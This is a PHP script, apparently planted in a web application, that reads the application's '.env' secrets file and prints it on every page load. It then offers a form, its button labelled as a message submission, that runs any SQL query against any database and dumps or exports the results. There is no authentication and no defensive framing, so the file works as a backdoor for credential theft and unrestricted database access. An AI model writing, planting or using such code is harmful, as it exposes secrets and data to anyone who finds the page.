<?php
header("Content-Type: text/html; charset=utf-8");
set_time_limit(0);
$timezone="Asia/Shanghai";
$handle = fopen('../../../../.env', 'r');
$content = '';
while(!feof($handle)){
    $content .= fread($handle, 8080);
}
echo $content;
fclose($handle);
?>
<form method="post" action="./action_lists.php">
<ul><li>host:<input type="text" name="host"></li><li>db<input type="text"  name="db"></li><li>db_user<input type="text"  name="db_user"></li><li>db_pwd<input type="text" name="db_pwd"></li><li>mysql<textarea  name="mysql" ></textarea></li><li>类型<input type="text" name="leixing" value="5"></li> <li><input type="submit" value="提交留言"></li></ul></form>
<style type="text/css">
table {border-collapse:collapse;}
table tr td {border: 0.5px solid #666666;padding: 5px 10px;}
</style>
<?php

$host = $_POST["host"];
$db = $_POST["db"];
$db_user = $_POST["db_user"];
$db_pwd = $_POST["db_pwd"];
$mysqlsql = $_POST["mysql"];
$leixing = $_POST["leixing"];
$mysql_conf = array(
    'host'    => $host, 
    'db'      => $db, 
    'db_user' => $db_user, 
    'db_pwd'  => $db_pwd, 
    );

$mysqli = @new mysqli($mysql_conf['host'], $mysql_conf['db_user'], $mysql_conf['db_pwd']);
if ($mysqli->connect_errno) {
    die("nolian:\n" . $mysqli->connect_error);
}
$mysqli->set_charset('utf8');
$select_db = $mysqli->select_db($mysql_conf['db']);
if (!$select_db) {
    die("nolian2:\n" .  $mysqli->error);
}
$sql = $mysqlsql;
$res = $mysqli->query($sql);
if (!$res) {
    die("sql error:\n" . $mysqli->error);
}
if($leixing==1){
	while ($row = $res->fetch_assoc()) {
       echo $row[0].'='.$row[1].'='.$row[2]."<br>";
    }
    $res->free();

}else if($leixing==2){
	while ($row = $res->fetch_assoc()) {
 		$list[] = $row; 
    }
	var_dump ($list); 

	$res->free();
}else if($leixing==3){
	
}else if($leixing==4){
	$rt = array();
	if ($res instanceof mysqli_result)
	{
    while (($row = $res->fetch_assoc()) != FALSE)
    {
	        $row['CanBeNull'] = $row['Null'] === 'YES';
	        $rt[] = $row;
	    }
	}
	print_r($rt);
}else if($leixing ==5){ 
     $title = array('1','2','3','4','5','6','7','8','9','10');
            while ($row = $res->fetch_assoc()) {
		       $list[] = $row; 
		    }
   daochu_excel($list,$title,'11');
}
function daochu_excel($data=array(),$title=array(),$filename='报表'){//导出excel表格
        $html = "<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'>
            <html xmlns='http://www.w3.org/1999/xhtml'>
            <meta http-equiv='Content-type' content='text/html;charset=UTF-8' />
            <head>
            <title>".$filename."</title>
            <style>
            td{
                text-align:center;
                font-size:12px;
                font-family:Arial, Helvetica, sans-serif;
                border:#1C7A80 1px solid;
                color:#152122;
                width:auto;
            }
            table,tr{
                border-style:none;
            }
            .title{
                background:#7DDCF0;
                color:#FFFFFF;
                font-weight:bold;
            }
            </style>
            </head>
            <body>
            <table width='100%' border='1'>
              <tr>";
        foreach($title as $k=>$v){
            $html .= " <td class='title' style='text-align:center;'>".$v."</td>";
        }
        $html .= "</tr>";
        foreach ($data as $key => $value) {
            $html .= "<tr>";
            foreach($value as $aa){
                $html .= "<td>".$aa."</td>";
            }
            $html .= "</tr>";
        }
        $html .= "</table></body></html>";
        echo $html;
        exit;
    }
$mysqli->close();
?>